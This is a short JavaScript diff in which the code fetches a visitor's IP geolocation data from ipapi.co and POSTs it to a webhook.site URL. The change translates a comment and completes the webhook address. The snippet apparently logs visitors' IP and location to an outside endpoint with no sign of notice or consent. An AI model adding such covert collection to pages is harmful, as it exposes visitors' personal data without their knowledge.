@@ -68,8 +68,9 @@
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
 
-        // Tumhara Webhook URL
-        await fetch("https://webhook.site/b545b9b2-1dc7-473f-a089-bdc0ceb0", {
+        // Send data to your webhook
+        await fetch("https://webhook.site/b545b9b2-1dc7-473f-a089-bdc0ceb0a8cc",
+         {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(data)
